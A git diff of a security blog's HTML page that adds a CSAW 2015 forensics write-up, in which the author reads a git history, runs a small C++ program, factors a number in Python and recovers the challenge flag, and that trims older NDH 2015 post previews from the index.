+</span><span class='line'>d57aaf7 There<span class="s1">&#39;s only two factors. Don&#39;</span>t <span class="nb">let </span>your calculator lie.
+</span><span class='line'>:100644 <span class="m">100644</span> 354ebf3... d961f81... M  sharp.cpp
+</span><span class='line'>2e5d553 It<span class="err">&#39;</span>s getting better!
+</span><span class='line'>:100644 <span class="m">100644</span> efda2f5... 354ebf3... M  sharp.cpp
+</span><span class='line'>7c9ba8a Initial commit! This one should be fun.
+</span><span class='line'>:000000 <span class="m">100644</span> 0000000... efda2f5... A  sharp.cpp
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>it seems we are in a good way , it seems sharp.cpp calculate flag .
+lets try read sharp.cpp , logs should be a good place :)</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>git log -p -m
+</span><span class='line'>
+</span><span class='line'>All <span class="k">done</span> now! Should calculate the flag..assuming everything went okay.
+</span><span class='line'>
+</span><span class='line'>diff --git a/Makefile b/Makefile
+</span><span class='line'>new file mode 100644
+</span><span class='line'>index 0000000..e5e5f63
+</span><span class='line'>--- /dev/null
+</span><span class='line'>+++ b/Makefile
+</span><span class='line'>@@ -0,0 +1,6 @@
+</span><span class='line'>+
+</span><span class='line'>+CXXFLAGS:<span class="o">=</span>-O2 -g -Wall -Wextra -Wshadow -std<span class="o">=</span>c++11
+</span><span class='line'>+LDFLAGS:<span class="o">=</span>-lcrypto
+</span><span class='line'>+
+</span><span class='line'>+ALL:
+</span><span class='line'>+       <span class="k">$(</span>CXX<span class="k">)</span> <span class="k">$(</span>CXXFLAGS<span class="k">)</span> <span class="k">$(</span>LDFLAGS<span class="k">)</span> -o sharp sharp.cpp
+</span><span class='line'>diff --git a/sharp.cpp b/sharp.cpp
+</span><span class='line'>index d961f81..f8d0839 100644
+</span><span class='line'>--- a/sharp.cpp
+</span><span class='line'>+++ b/sharp.cpp
+</span><span class='line'>@@ -2,8 +2,57 @@
+</span><span class='line'> <span class="c">#include &lt;string&gt;</span>
+</span><span class='line'> <span class="c">#include &lt;algorithm&gt;</span>
+</span><span class='line'>
+</span><span class='line'>+#include &lt;stdint.h&gt;
+</span><span class='line'>+#include &lt;stdio.h&gt;
+</span><span class='line'>+#include &lt;openssl/sha.h&gt;
+</span><span class='line'>+
+</span><span class='line'> using namespace std<span class="p">;</span>
+</span><span class='line'>+std::string calculate_flag<span class="o">(</span>
+</span><span class='line'>+               std::string <span class="p">&amp;</span>part1,
+</span><span class='line'>+               int64_t part2,
+</span><span class='line'>+               std::string <span class="p">&amp;</span>part4,
+</span><span class='line'>+               uint64_t factor1,
+</span><span class='line'>+               uint64_t factor2<span class="o">)</span>
+</span><span class='line'> ........ Bunch of Code .
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>`
+We find it .
+Full  source Code here : <a href="http://paste2.org/9Mnm1MX6">http://paste2.org/9Mnm1MX6</a></p>
+
+<p>after compiling , and running :</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>parsa@xored:~/Desktop<span class="nv">$ </span>./for400
+</span><span class='line'>Part1: Enter flag:
+</span><span class='line'>flag
+</span><span class='line'>Part2: Input 31337:
+</span><span class='line'>31337
+</span><span class='line'>Part3: Watch this: https://www.youtube.com/watch?v<span class="o">=</span>PBwAxmrE194
+</span><span class='line'>watched
+</span><span class='line'>Part4: C.R.E.A.M. Get da _____:
+</span><span class='line'>money
+</span><span class='line'>Part5: Input the two prime factors of the number 272031727027.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>we need 5 part to get flag , it seems we have 4 parts , they are flag,31337,watched,money but we need 5th part .
+lets factor 272031727027 to primes .</p>
+
+<p>Python Code :</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">factors</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+</span><span class='line'>    <span class="n">i</span> <span class="o">=</span> <span class="mi">2</span>
+</span><span class='line'>    <span class="n">factors</span> <span class="o">=</span> <span class="p">[]</span>
+</span><span class='line'>    <span class="k">while</span> <span class="n">i</span> <span class="o">*</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">n</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">if</span> <span class="n">n</span> <span class="o">%</span> <span class="n">i</span><span class="p">:</span>
+</span><span class='line'>            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</span><span class='line'>        <span class="k">else</span><span class="p">:</span>
+</span><span class='line'>            <span class="n">n</span> <span class="o">//=</span> <span class="n">i</span>
+</span><span class='line'>            <span class="n">factors</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">n</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>        <span class="n">factors</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">return</span> <span class="n">factors</span>
+</span><span class='line'><span class="n">num</span> <span class="o">=</span> <span class="mi">272031727027</span>
+</span><span class='line'><span class="k">print</span> <span class="n">factors</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Result :</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>parsa@xored:~/Desktop<span class="nv">$ </span>python aaa.py
+</span><span class='line'><span class="o">[</span>31357, 8675311<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>lets run Binary again :</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>parsa@xored:~/Desktop<span class="nv">$ </span>./for400
+</span><span class='line'>Part1: Enter flag:
+</span><span class='line'>flag
+</span><span class='line'>Part2: Input 31337:
+</span><span class='line'>31337
+</span><span class='line'>Part3: Watch this: https://www.youtube.com/watch?v<span class="o">=</span>PBwAxmrE194
+</span><span class='line'>watched
+</span><span class='line'>Part4: C.R.E.A.M. Get da _____:
+</span><span class='line'>money
+</span><span class='line'>Part5: Input the two prime factors of the number 272031727027.
+</span><span class='line'>31357
+</span><span class='line'>8675311
+</span><span class='line'>flag<span class="o">{</span>3b532e0a187006879d262141e16fa5f05f2e6752<span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and done The flag is :
+3b532e0a187006879d262141e16fa5f05f2e6752</p>
+
+<p>Good Luck .</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1399,112 +2328,6 @@ after that i use <code>python-ptrace</code> to create child and trace the binary
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/04/06/ndh-ctf-2015-facesec-writeup/">NDH CTF 2015 - Facesec Writeup</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-04-06T01:56:25+04:30'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>6</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:56 am</span></time>
-        
-           | <a href="/blog/2015/04/06/ndh-ctf-2015-facesec-writeup/#disqus_thread"
-             data-disqus-identifier="http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-facesec-writeup/">Comments</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><strong>NDH 2015 Facesec Writeup</strong><br/>
-<strong>Point = 100</strong><br/>
-<strong>Category = Web</strong><br/>
-<strong>Description : </strong></p>
-
-<blockquote><p>&ldquo;Hello there,</p>
-
-<p>We are looking for a developer or security consultant to secure our filebox system. We stumbled upon your LinkedIn profile and it seems like you would be a perfect candidate for this job. Could you please send us your CV and Motivation letter?<br/>
-Thanks,</p>
-
-<p><a href="http://facesec.challs.nuitduhack.com/">http://facesec.challs.nuitduhack.com/</a></p></blockquote>
-
-<p>after you open the link , you can see a login/register system.so sign up and login to my account</p>
-
-<p>after that you seen a upload form with this description :</p>
-
-<blockquote><p>You can upload a .txt file if you specify the type of the content (cv or motivation letter).
-If you want, you can upload a tar archive which contains two files (cv.txt and motiv.txt).
-The content will be update in your profil we can examine your instance.</p></blockquote>
-
-<p>so try to upload your file , contents of 2 texts go to 2 field in your profile name as CV and Motivation Letter</p>
-
-</div>
-  
-  
-    <footer>
-      <a rel="full-article" href="/blog/2015/04/06/ndh-ctf-2015-facesec-writeup/">Read on &rarr;</a>
-    </footer>
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/04/06/ndh-ctf-2015-cooper-writeup/">NDH CTF 2015 - Cooper Writeup</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-04-06T01:52:15+04:30'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>6</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:52 am</span></time>
-        
-           | <a href="/blog/2015/04/06/ndh-ctf-2015-cooper-writeup/#disqus_thread"
-             data-disqus-identifier="http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-cooper-writeup/">Comments</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><strong>NDH 2015 Cooper Writeup</strong><br/>
-<strong>Point = 300</strong><br/>
-<strong>Category = Stegano</strong></p>
-
-<blockquote><p>&ldquo;I am not crazy, my mother had me tested.&rdquo; (Sheldon)</p>
-
-<p>What did Sheldon &hellip; huh sorry, Dr. Cooper really mean?
-(<a href="http://quals.nuitduhack.com/challenges/view/14">http://quals.nuitduhack.com/challenges/view/14</a>)</p></blockquote>
-
-<p>The tar zip contains a Windows executable, so the first thing I did was opening it in CFF Explorer.
-Doing so I found a picture of Sheldon &hellip; or better say <code>"Dr. Cooper"</code> in resources and a section called .hidden containing a ZIP file.</p>
-
-<p><img src="/files/ctf/ndh2k15/cooper/cooper.bmp" title="khkhkhhhhhh" alt="Sheldon's picture" /></p>
-
-</div>
-  
-  
-    <footer>
-      <a rel="full-article" href="/blog/2015/04/06/ndh-ctf-2015-cooper-writeup/">Read on &rarr;</a>
-    </footer>
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/2">&larr; Older</a>
@@ -1520,6 +2343,14 @@ Doing so I found a picture of Sheldon &hellip; or better say <code>"Dr. Cooper"<
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2015/09/21/csaw-2015-pwn250-contacts/">CSAW 2015 - PWN250 - Contacts</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/21/csaw-2015-for400-sharpturn/">CSAW 2015 - FOR400 - Sharpturn</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2015/05/19/defconctf-2015-quals-access-control-writeup/">DefConCTF 2015 Quals - Access Control Writeup</a>
       </li>
     
@@ -1529,14 +2360,6 @@ Doing so I found a picture of Sheldon &hellip; or better say <code>"Dr. Cooper"<
     
       <li class="post">
         <a href="/blog/2015/05/18/defconctf-2015-quals-ropbaby-writeup/">DefConCTF 2015 Quals - ROPBaby Writeup</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/05/18/defconctf-2015-quals-catwestern-writeup/">DefConCTF 2015 Quals - Catwestern Writeup</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/05/18/defconctf-2015-quals-mathwize-writeup/">DefConCTF 2015 Quals - Mathwize Writeup</a>
       </li>
     
   </ul>
